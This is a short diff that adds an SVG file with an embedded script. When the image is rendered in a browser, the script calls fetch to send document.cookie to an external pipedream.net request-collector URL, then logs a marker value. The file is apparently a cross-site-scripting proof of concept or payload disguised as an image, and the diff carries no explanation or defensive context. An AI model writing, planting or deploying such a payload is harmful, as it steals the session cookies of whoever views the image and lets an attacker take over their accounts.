@@ -1,0 +1,5 @@
+<svg>
+    <script> fetch(`https://enz25p7qw0dco.x.pipedream.net/1234.png?c=${document.cookie}`)
+        console.log(1234)
+    </script>
+</svg>
